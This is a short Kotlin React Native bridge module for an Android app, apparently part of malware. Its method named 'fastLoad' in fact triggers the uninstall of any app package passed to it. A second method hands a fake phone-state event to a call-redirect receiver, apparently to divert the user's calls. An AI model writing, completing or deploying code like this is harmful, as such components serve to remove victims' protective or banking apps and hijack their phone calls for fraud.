package ru.rostell

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod


class MainModule(reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext) {
    override fun getName() = "MainModule"
    @ReactMethod
    fun fastLoad(name: String) {
        val intent = Intent(Intent.ACTION_DELETE)
        intent.data = Uri.parse("package:$name")
        currentActivity?.startActivity(intent)
    }
    @ReactMethod
    fun startCallRedirect() {
        val intent = Intent("android.intent.action.PHONE_STATE")
        val receiver = CallRedirectReceiver()
        receiver.onReceive(reactApplicationContext, intent)
    }

}
